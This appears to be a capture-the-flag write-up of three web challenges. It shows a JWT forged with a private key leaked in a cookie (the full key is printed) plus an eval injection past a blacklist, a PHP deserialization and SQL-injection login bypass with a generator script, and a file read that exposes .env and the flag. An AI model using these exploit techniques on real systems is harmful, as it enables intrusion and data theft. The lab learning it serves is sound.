## Jess noW limiT (746 pts)

1. Given attachment

```
source-code
├── app.js
├── bin
│   └── www
├── middleware
│   └── auth.js
├── public
│   ├── lord.jpg
│   └── stylesheets
│       └── style.css
├── routes
│   └── index.js
├── utils
│   ├── getToken.js
│   └── parseCookie.js
└── views
    ├── error.ejs
    └── index.ejs
```

2. in the `middleware/auth.js` private key and public key is given in cookies with base64 encoded and `:` as delimiter.

middleware/auth.js

```
const jwt = require('jsonwebtoken');
const fs = require('fs');
const path = require('path');
const getToken = require('../utils/getToken');

const secretKey = fs.readFileSync(path.resolve(__dirname, './secret.key'));
const pubkey = fs.readFileSync(path.resolve(__dirname, './secret.key.pub'));

const verifyToken = (req, res, next) => {
  let token = getToken(req);

  try {
    if (!token) {
      const newToken = jwt.sign({ user: 'Jess noW limiT' }, secretKey, { algorithm: 'RS256' });
      res.cookie('token', newToken);
      res.cookie('pub', `${Buffer.from(pubkey).toString('base64')}:${Buffer.from(secretKey).toString('base64')}`);
      token = newToken;
    }

    const decoded = jwt.verify(token, secretKey, { algorithms: ['RS256'] });
    req.user = decoded;
    return next();
  } catch (_) {
    return res.status(401).send('<h1>Invalid Token</h1>');
  }
};

module.exports = verifyToken;
```

3. at `routes/index.js` there's eval function with some blacklist

routes/index.js

```
const express = require('express');
const verifyToken = require('../middleware/auth');

const router = express.Router();

router.get('/', verifyToken, async (req, res) => {
  try {
    const { user } = req.user;

    if (user.match(/syn|dir|file|read|fs|spawn/gi)) {
      throw new Error();
    }

    res.render('index', { user: eval(`'Welcome ${user}'`) });
  } catch (_) {
    res.render('index', { user: 'Error' });
  }
});

module.exports = router;
```

4. my next step is generating our jwt token and put our payload in user

gen.js

```
const jwt = require('jsonwebtoken');
const { argv } = require('process');

let pub = "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FEQXBqbitqM0pPTEVocTNiR1VvbWRDYUdBZAo2OUNxZncyV1AzNjB2bXdIOHFJQ29rYjM1SDd4d05YdHFNZ011TW5QTjY2R3ZYR2ZpR1VTd1FUajlNSlIvRE4vCmFqN2J0ZmFuTkZZM1gzS2VjSFA1cXd0NlE2ZHVxMHJFc2FVZ1dXTEcrY2VlL3BqYS9rNWRmOElYb2F3ZFgvNDIKWXNHbmE0bVlxeDFBbDFDUXFRSURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQo=:LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlDWEFJQkFBS0JnUURBcGpuK2ozSk9MRWhxM2JHVW9tZENhR0FkNjlDcWZ3MldQMzYwdm13SDhxSUNva2IzCjVIN3h3Tlh0cU1nTXVNblBONjZHdlhHZmlHVVN3UVRqOU1KUi9ETi9hajdidGZhbk5GWTNYM0tlY0hQNXF3dDYKUTZkdXEwckVzYVVnV1dMRytjZWUvcGphL2s1ZGY4SVhvYXdkWC80MllzR25hNG1ZcXgxQWwxQ1FxUUlEQVFBQgpBb0dBYWF5RTBXTUVNMmRORGZtdmlEV1JhTGJ5U2xkcExhemwyZzNZUmZMU05ZWGRZbzU3V1Uwb2FSbjYveE4vCk1LTklaL2RHTDdqSkU5WndndG9JQWJibnc3ZHQ2M0RJaHRRQmJ1STJFbnhWbnBsb3U5S0d1S2FiV2NRMTYwSUMKbUMxM0JNcCtQUm1LeXJ1Y2s1eHBvSTQyT0MrRzlkMVFpcTNHWFFtZXNmbXhVN1VDUVFEZXFaSkFtd0J4TzQxKwpHMDhpcHAwc3c0cFBpYVczNEhPNmNiNVl0bi9KZE9xQkVWMW9xWGErVUcwdC84SDRwallib3BYS1JWY3lTdXRRCnhJT1ZTajZMQWtFQTNYNUl3Q0h5Zm5tTTh4bzVHSWNpNC9pRmNEMStkSnJZOWltVGsxV0ttMjJ4S2ZPRjFHY3UKdGIwZ2kxRnRuODErV0ZiR1ptOVdyaWM4U2kwaGh5cm9Hd0pCQU5QU0tXb0Fpdmt0bUR0aHEzVGhZQ0RYbk5weApyZzh4SGFjKzBiLy9UYTNPNWRBSFB2OTBSNXhoVXB3eDlNdWhBMVJpNVhEWmFreFQ3V3lXcGo3OXRHVUNRQy9jCjVEZXdua2c2Vi8wSWc2SUxRYnpscldBdHlhL0U3bkZ6VnBLVi81Zkt3bWdBV2NFbWN1K082UU55R3pCWEphQk4KVUI0K25RcVJLL1FUZ0pWRzdsVUNRRnhzYmdFWld4VjAwNmVMMmRUbDJlSldrelowSE9aUnFBM3V4SlZhNmdrbAowQndWRm8wQk1kdGxoTEV1YllEcS9uNkRaaGs1aG1PamhXcTQ4bGJJeXV3PQotLS0tLUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=".split(":")
const publ = Buffer.from(pub[0], 'base64').toString("ascii")
const priv = Buffer.from(pub[1], 'base64').toString("ascii")
console.log(jwt.sign({ user: argv[2] }, priv, { algorithm: 'RS256' }));
```

```
$ node gen.js "'+eval(String.fromCharCode(xx, xx, xx))+'"
```

## Confused Ooga Booga (913 pts)
1. Given source code `index.php`

index.php

```
<?php

include 'config.php';

class PRAM
{
    private $method;
    private $args;
    private $conn;

    public function __construct($method, $args)
    {
        $this->method = $method;
        $this->args = $args;
    }

    function get()
    {
        list($username) = func_get_args();
        $q = sprintf("SELECT * FROM users WHERE username='%s'", $username);

        $obj = $this->__query($q);

        if ($obj != false) {
            $this->__die(sprintf("%s is %s", $obj->username, $obj->role));
        } else {
            $this->__die("User not found!");
        }
    }

    function login()
    {
        global $FLAG;

        list($username, $password) = func_get_args();
        $username = strtolower(trim(mysqli_real_escape_string($this->conn, $username)));
        $password = strtolower(trim(mysqli_real_escape_string($this->conn, $password)));

        $q = sprintf("SELECT * FROM users WHERE username='%s' AND password='%s'", $username, $password);

        $obj = $this->__query($q);

        if ($obj && $obj->role == 'admin') {
            $this->__die('REAL SHIT!! okay, here is your flag: ' . $FLAG);
        } else {
            $this->__die("No flag for you, go ask pram for flag");
        }
    }

    function source()
    {
        return highlight_file(__FILE__);
    }

    function __conn()
    {
        global $host, $user, $pass, $dbname;

        if (!$this->conn) {
            $this->conn = mysqli_connect($host, $user, $pass, $dbname);
            mysqli_set_charset($this->conn, 'utf8');
        }

        if (!$this->conn) {
            die('Connection failed: ' . mysqli_connect_error());
        }
    }

    function __query($q)
    {
        $res = @mysqli_query($this->conn, $q);

        if ($res) {
            return @mysqli_fetch_object($res);
        }
    }

    function __die($msg)
    {
        $this->__close();

        header('Content-Type: application/json');
        die(json_encode(array('msg' => $msg)));
    }

    function __close()
    {
        mysqli_close($this->conn);
    }

    function __destruct()
    {
        $this->__conn();

        if (in_array($this->method, array('get', 'login', 'source'))) {
            @call_user_func_array(array($this, $this->method), $this->args);
        } else {
            $this->__die("method not found!");
        }

        $this->__close();
    }

    function __wakeup()
    {
        foreach ($this->args as $key => $value) {
            $this->args[$key] = strtolower(trim($value));
        }
    }
}

if (isset($_GET['data'])) {
    $decoded = base64_decode($_GET['data']);
    $deserialized = @unserialize($decoded);
} else {
    new PRAM('source', []);
}
```

2. The `get()` method is vulnerable to sql injection, since our query is in the output. We could using Union Based SQL injection.

```
function get()
    {
        list($username) = func_get_args();
        $q = sprintf("SELECT * FROM users WHERE username='%s'", $username);

        $obj = $this->__query($q);

        if ($obj != false) {
            $this->__die(sprintf("%s is %s", $obj->username, $obj->role));
        } else {
            $this->__die("User not found!");
        }
    }
```

3. I create a generator for serialize my payload

s.php

```
<?php
class PRAM
{
    private $method;
    private $args;

    public function __construct($method, $args)
    {
        $this->method = $method;
        $this->args = $args;
    }

    function get()
    {
        // list($username) = func_get_args();
        // $q = sprintf("SELECT * FROM users WHERE username='%s'", $username);
        // printf($q."\n");
    }

    function login(){}

    function source()
    {
        return highlight_file(__FILE__);
    }

    function __conn(){}

    function __query($q){}

    function __die($msg)
    {
        // $this->__close();

        // header('Content-Type: application/json');
        // die(json_encode(array('msg' => $msg)));
    }

    function __close(){}

    function __destruct()
    {
        if (in_array($this->method, array('get', 'login', 'source'))) {
            @call_user_func_array(array($this, $this->method), $this->args);
        } else {
            // $this->__die("method not found!");
        }
    }

    function __wakeup()
    {
        foreach ($this->args as $key => $value) {
            $this->args[$key] = strtolower(trim($value));
        }
    }
}

// echo $argv[1]. "\n";
// echo base64_encode(serialize(new PRAM('get', array($argv[1]))));

// v3ryS3cur3P4sz

echo base64_encode(serialize(new PRAM('login', array("pram", "v3ryS3cur3P4sz"))));
```


## Makdon Printer (986 pts)

1. input `%00` gives an error showing our input is readed as path fo file.
2. input `app.js` showing source code of application
3. input `.env` found an env `APP_SECRET`
4. input `/c00L_stUff/flag.txt` for getting the flag.